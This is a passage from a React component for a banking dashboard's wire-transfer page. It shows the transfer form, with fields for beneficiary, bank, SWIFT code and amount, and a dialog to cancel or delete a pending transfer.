            <TransactionGate loading={accountsLoading} hasUsableAccount={hasUsableAccount} restrictedAccounts={restrictedAccounts}>
              <Card className="rounded-xl border-0 bg-white p-8 shadow-sm">
                <div className="flex items-center space-x-3 mb-6">
                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center">
                    <Globe className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold">Initiate Wire Transfer</h2>
                    <p className="text-muted-foreground">Start a new international wire transfer securely.</p>
                  </div>
                </div>

                <form onSubmit={handleInitiateTransfer} className="space-y-6">
                  <div className="space-y-2">
                    <Label>From Account</Label>
                    <Select value={accountId || ""} onValueChange={setAccountId}>
                      <SelectTrigger className="h-12">
                        <SelectValue placeholder="Select source account" />
                      </SelectTrigger>
                      <SelectContent>
                        {accounts.map((a) => (
                          <SelectItem key={a.id} value={a.id} disabled={!isAccountUsable(a.status)}>
                            {a.account_type.toUpperCase()} — {a.account_number} — {a.currency}{" "}
                            {a.computed_balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                            {!isAccountUsable(a.status) ? ` — ${getAccountStatusLabel(a.status)}` : ""}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <label className="text-sm font-medium">Beneficiary Name</label>
                      <Input
                        value={transferData.beneficiaryName}
                        onChange={(e) => setTransferData({ ...transferData, beneficiaryName: e.target.value })}
                        placeholder="John Doe"
                        required
                        className="h-12"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium">Account Number</label>
                      <Input
                        value={transferData.beneficiaryAccount}
                        onChange={(e) => setTransferData({ ...transferData, beneficiaryAccount: e.target.value })}
                        placeholder="1234567890"
                        required
                        className="h-12"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium">Bank Name</label>
                      <Select
                        value={
                          CANADIAN_BANKS.includes(transferData.beneficiaryBank) || USA_BANKS.includes(transferData.beneficiaryBank)
                            ? transferData.beneficiaryBank
                            : isCustomBank || (transferData.beneficiaryBank && !CANADIAN_BANKS.includes(transferData.beneficiaryBank) && !USA_BANKS.includes(transferData.beneficiaryBank))
                            ? "OTHER"
                            : ""
                        }
                        onValueChange={(val) => {
                          if (val === "OTHER") {
                            setIsCustomBank(true);
                            setTransferData((prev) => ({ ...prev, beneficiaryBank: "" }));
                          } else {
                            setIsCustomBank(false);
                            const isCanada = CANADIAN_BANKS.includes(val);
                            const isUSA = USA_BANKS.includes(val);
                            setTransferData((prev) => ({
                              ...prev,
                              beneficiaryBank: val,
                              beneficiaryCountry:
                                isCanada
                                  ? (!prev.beneficiaryCountry || prev.beneficiaryCountry === "United States" ? "Canada" : prev.beneficiaryCountry)
                                  : isUSA
                                  ? (!prev.beneficiaryCountry || prev.beneficiaryCountry === "Canada" ? "United States" : prev.beneficiaryCountry)
                                  : prev.beneficiaryCountry,
                            }));
                          }
                        }}
                      >
                        <SelectTrigger className="h-12">
                          <SelectValue placeholder="Select beneficiary bank" />
                        </SelectTrigger>
                        <SelectContent className="max-h-[300px]">
                          <SelectGroup>
                            <SelectLabel className="text-xs font-bold text-muted-foreground uppercase tracking-wider">
                              Canada
                            </SelectLabel>
                            {CANADIAN_BANKS.map((bank) => (
                              <SelectItem key={bank} value={bank}>
                                {bank}
                              </SelectItem>
                            ))}
                          </SelectGroup>
                          <SelectSeparator />
                          <SelectGroup>
                            <SelectLabel className="text-xs font-bold text-muted-foreground uppercase tracking-wider">
                              United States
                            </SelectLabel>
                            {USA_BANKS.map((bank) => (
                              <SelectItem key={bank} value={bank}>
                                {bank}
                              </SelectItem>
                            ))}
                          </SelectGroup>
                          <SelectSeparator />
                          <SelectGroup>
                            <SelectItem value="OTHER">Other Bank (Enter custom bank)</SelectItem>
                          </SelectGroup>
                        </SelectContent>
                      </Select>

                      {(isCustomBank || (transferData.beneficiaryBank && !CANADIAN_BANKS.includes(transferData.beneficiaryBank) && !USA_BANKS.includes(transferData.beneficiaryBank))) && (
                        <Input
                          value={transferData.beneficiaryBank}
                          onChange={(e) => setTransferData({ ...transferData, beneficiaryBank: e.target.value })}
                          placeholder="Enter custom bank name"
                          required
                          className="h-12 mt-2"
                        />
                      )}
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium">Country</label>
                      <Input
                        value={transferData.beneficiaryCountry}
                        onChange={(e) => setTransferData({ ...transferData, beneficiaryCountry: e.target.value })}
                        placeholder="United States"
                        required
                        className="h-12"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium">SWIFT Code</label>
                      <Input
                        value={transferData.swiftCode}
                        onChange={(e) => setTransferData({ ...transferData, swiftCode: e.target.value })}
                        placeholder="ABCDUS33XXX"
                        required
                        className="h-12"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium">Amount (USD)</label>
                      <Input
                        type="number"
                        step="0.01"
                        value={transferData.amount}
                        onChange={(e) => setTransferData({ ...transferData, amount: e.target.value })}
                        placeholder="1000.00"
                        required
                        className="h-12"
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium">Purpose (Optional)</label>
                    <Textarea
                      value={transferData.purpose}
                      onChange={(e) => setTransferData({ ...transferData, purpose: e.target.value })}
                      placeholder="Payment for services"
                      className="min-h-[100px]"
                    />
                  </div>

                  <Button type="submit" size="lg" className="w-full h-12" disabled={loading || !accountId}>
                    {loading ? "Processing..." : "Initiate Transfer"}
                  </Button>
                </form>
              </Card>
            </TransactionGate>
          </div>
        )}

        {/* Confirmation Action Dialog (Cancel / Delete) */}
        <Dialog open={!!actionModal} onOpenChange={(open) => !open && !actionLoading && setActionModal(null)}>
          <DialogContent className="sm:max-w-[480px]">
            {actionModal && (
              <>
                <DialogHeader>
                  <div className="flex items-center gap-3 mb-2">
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                      actionModal.type === "delete" ? "bg-red-100 text-red-600" : "bg-amber-100 text-amber-600"
                    }`}>
                      {actionModal.type === "delete" ? (
                        <Trash2 className="w-5 h-5" />
                      ) : (
                        <Ban className="w-5 h-5" />
                      )}
                    </div>
                    <DialogTitle>
                      {actionModal.type === "delete" ? "Delete Wire Transfer" : "Cancel Pending Wire Transfer"}
                    </DialogTitle>
                  </div>
                  <DialogDescription className="text-left text-sm text-slate-600 pt-1">
                    {actionModal.type === "delete" ? (
                      <>
                        Are you sure you want to permanently delete this pending wire transfer? All associated records will be removed. This action cannot be undone.
                      </>
                    ) : (
                      <>
                        Are you sure you want to cancel this pending wire transfer? It will be marked as <strong>cancelled</strong> and no funds will be deducted.
                      </>
                    )}
                  </DialogDescription>
                </DialogHeader>

                <div className="rounded-lg border border-slate-200 bg-slate-50 p-4 my-2 text-sm space-y-2">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Reference:</span>
                    <span className="font-semibold text-slate-900">{getWireTransferReference(actionModal.transfer.id)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Beneficiary:</span>
                    <span className="font-semibold text-slate-900">{actionModal.transfer.beneficiary_name}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Bank:</span>
                    <span className="font-medium text-slate-800">{actionModal.transfer.beneficiary_bank}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Amount:</span>
                    <span className="font-bold text-slate-900">
                      ${actionModal.transfer.amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </span>
                  </div>
                </div>

                <DialogFooter className="gap-2 sm:gap-0 mt-4">
                  <Button
                    type="button"
                    variant="outline"
                    onClick={() => setActionModal(null)}
                    disabled={actionLoading}
                  >
                    Go Back
                  </Button>
                  <Button
                    type="button"
                    onClick={() => {
                      if (actionModal.type === "delete") {
                        void handleDeleteWireTransfer(actionModal.transfer);
                      } else {
                        void handleCancelWireTransfer(actionModal.transfer);
                      }
                    }}
                    disabled={actionLoading}
                    className={actionModal.type === "delete" ? "bg-red-600 hover:bg-red-700 text-white" : "bg-amber-600 hover:bg-amber-700 text-white"}
                  >
                    {actionLoading
                      ? "Processing..."
                      : actionModal.type === "delete"
                      ? "Yes, Delete Transfer"
                      : "Yes, Cancel Transfer"}
                  </Button>
                </DialogFooter>
              </>
            )}
          </DialogContent>
        </Dialog>
      </div>
    </div>
    </DashboardLayout>
  );
};

export default WireTransfer;
